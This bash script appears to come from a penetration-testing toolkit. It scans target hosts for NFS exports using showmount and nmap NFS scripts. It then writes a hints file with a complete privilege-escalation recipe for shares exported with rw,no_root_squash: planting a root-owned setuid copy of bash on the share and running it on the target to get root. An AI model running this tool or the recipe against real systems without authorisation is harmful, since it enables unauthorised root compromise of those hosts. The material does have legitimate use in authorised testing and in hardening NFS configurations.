#!/usr/bin/env bash
# enum-nfs.sh — NFS exports + no_root_squash detection.
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$SCRIPT_DIR/_lib.sh"
parse_common_args "$@" || exit 1
log "nfs: $(wc -l < "$TARGETS") targets -> $OUT"

IPS=$(ips_only "$TARGETS")

# showmount -e
if have showmount; then
    for ip in $IPS; do
        mkdir -p "$OUT/$ip"
        showmount -e "$ip" 2>&1 | tee "$OUT/$ip/exports.txt" || true
    done
fi

# nmap rpcinfo + nfs-* scripts
if have nmap; then
    log "nmap rpcinfo / nfs-showmount / nfs-ls"
    nmap -Pn -p111,2049 --script 'rpcinfo,nfs-showmount,nfs-ls,nfs-statfs' \
        -iL <(echo "$IPS") -oA "$OUT/nmap-nfs" >/dev/null 2>&1 || true
fi

# Hint for exploitation
cat > "$OUT/_hints.txt" <<'EOF'
If exports show (rw,no_root_squash) you can:
    mkdir /tmp/nfs && sudo mount -o vers=3 <ip>:<export> /tmp/nfs
    cp /bin/bash /tmp/nfs/x && sudo chown root:root /tmp/nfs/x && sudo chmod u+s /tmp/nfs/x
    # On target: /export/x -p   -> uid 0
EOF

log "nfs dispatcher done."
